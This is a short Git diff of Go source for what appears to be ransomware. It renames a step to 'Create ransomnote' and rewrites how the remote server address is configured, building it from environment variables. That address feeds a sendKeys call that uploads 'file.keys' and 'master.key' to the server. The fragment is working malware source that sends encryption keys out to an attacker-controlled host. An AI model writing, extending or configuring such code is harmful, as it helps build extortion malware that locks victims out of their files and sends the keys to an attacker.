@@ -143,11 +143,22 @@ func main() {
 		fmt.Println("✅ file.keys created correctly.")
 	}
 
-	// ✅ Crear archivo de advertencia
+	// ✅ Create ransomnote
 	createWarningFile()
 
-	serverURL := "https://example.com" // Replace with your server URL
-	if serverURL != "" {
+	host := os.Getenv("SERVER_HOST")
+	port := os.Getenv("SERVER_PORT")
+	
+	if host == "" {
+		host = "localhost"
+	}
+	if port == "" {
+		port = "8443"
+	}
+	
+	serverURL := fmt.Sprintf("https://%s:%s", host, port)
+	
+		if serverURL != "" {
 		err:= sendKeys(serverURL, "file.keys", "master.key")
 		if err != nil {
 			log.Println("Error sending keys to server:", err)
